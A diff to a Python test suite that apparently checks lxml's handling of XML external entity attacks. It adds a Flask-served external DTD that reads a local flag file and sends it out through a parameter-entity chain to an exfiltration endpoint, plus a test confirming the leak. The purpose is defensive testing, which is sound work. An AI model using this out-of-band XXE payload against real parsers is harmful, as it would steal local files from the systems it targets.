@@ -70,6 +70,10 @@ dtd_retrieval = f"""<?xml version="1.0"?>
 <foo>bar</foo>
 """
 
+exfiltrate_through_dtd_retrieval = f"""<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{HOST}:{PORT}/exfiltrate-through.dtd"> %xxe; ]>
+"""
+
 # ==============================================================================
 # other setup
 
@@ -93,6 +97,22 @@ hit_xxe = False
 def test_xxe():
     global hit_xxe
     hit_xxe = True
+    return "ok"
+
+@app.route("/exfiltrate-through.dtd")
+def exfiltrate_through_dtd():
+    return f"""<!ENTITY % file SYSTEM "file://{FLAG_PATH}">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://{HOST}:{PORT}/exfiltrate-data?data=%file;'>">
+%eval;
+%exfiltrate;
+    """
+
+exfiltrated_data = None
+@app.route("/exfiltrate-data")
+def exfiltrate_data():
+    from flask import request
+    global exfiltrated_data
+    exfiltrated_data = request.args["data"]
     return "ok"
 
 def run_app():
@@ -346,7 +366,7 @@ class TestLxml:
         parser = lxml.etree.XMLParser()
         root = lxml.etree.fromstring(local_xxe, parser=parser)
         assert root.tag == "test"
-        assert root.text == "SECRET_FLAG\n", root.text
+        assert root.text == "SECRET_FLAG", root.text
 
     @staticmethod
     def test_local_xxe_disabled():
@@ -412,6 +432,16 @@ class TestLxml:
             pass
         assert hit_dtd == False
 
+    @staticmethod
+    def test_exfiltrate_through_dtd():
+        # note that this only works when the data to exfiltrate does not contain a newline :|
+        global exfiltrated_data
+        exfiltrated_data = None
+        parser = lxml.etree.XMLParser(load_dtd=True, no_network=False)
+        with pytest.raises(lxml.etree.XMLSyntaxError):
+            lxml.etree.fromstring(exfiltrate_through_dtd_retrieval, parser=parser)
+
+        assert exfiltrated_data == "SECRET_FLAG"
 
 # ==============================================================================
 
